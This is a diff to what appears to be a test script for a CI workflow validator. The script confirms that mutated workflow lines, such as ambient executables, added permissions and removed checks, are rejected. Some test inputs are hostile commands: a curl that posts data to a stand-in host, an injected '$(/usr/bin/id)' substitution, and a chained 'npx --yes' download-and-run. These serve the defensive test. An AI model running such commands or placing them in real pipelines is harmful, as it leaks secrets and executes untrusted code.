@@ -140,7 +140,14 @@ def main() -> None:
     expect_red(replace_text(author, f"{entry} author", "python3 adapters/jev_api.py author"))
     expect_red(replace_text(project, f"{entry} project", "nix shell .#effect-toolchain -c envs-effect project"))
     expect_red(replace_text(project, f"{entry} project", f"npx --yes wrangler@4 && {entry} project"))
-    expect_red(replace_text(author, '"$tool/gh" pr create', "gh pr create"))
+    expect_red(replace_text(author, '"$tool/git" show --no-patch --format=\'HANDOFF_HEAD=%H\'',
+                            '"$tool/gh" pr create --base proposals'))
+    expect_red(replace_text(author, "  contents: write\n", "  contents: write\n  pull-requests: write\n"))
+    expect_red(replace_text(project, "  contents: write\n", "  contents: write\n  pull-requests: write\n"))
+    expect_red(replace_text(project, "      - name: Publish non-secret handoff candidate for owner PR\n",
+                            "      - name: Publish non-secret handoff candidate for owner PR\n        continue-on-error: true\n"))
+    expect_red(replace_text(author, '          "$tool/git" show --no-patch --format=\'HANDOFF_HEAD=%H\'\n', ""))
+    expect_red(replace_text(project, '          "$tool/git" ls-remote --exit-code origin "refs/heads/$branch"\n', ""))
     expect_red(replace_text(author, '"$tool/git" push', "git push"))
     # Effect workflows consume the provided artifact; any rebuild or Nix install there is RED.
     expect_red(replace_text(project, identity_step, f"      - name: Rebuild\n        run: {build}\n\n{identity_step}"))
@@ -155,7 +162,7 @@ def main() -> None:
     # Absolute-path, chained, or rebound executables are as ambient as bare names.
     expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
     expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
-    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
+    expect_red(replace_text(project, '"$tool/git" ls-remote', '"/usr/bin/git" ls-remote'))
     expect_red(replace_text(project, 'tool="$ENVS_EFFECT_BIN"', 'tool="/usr/bin"'))
     expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
     expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
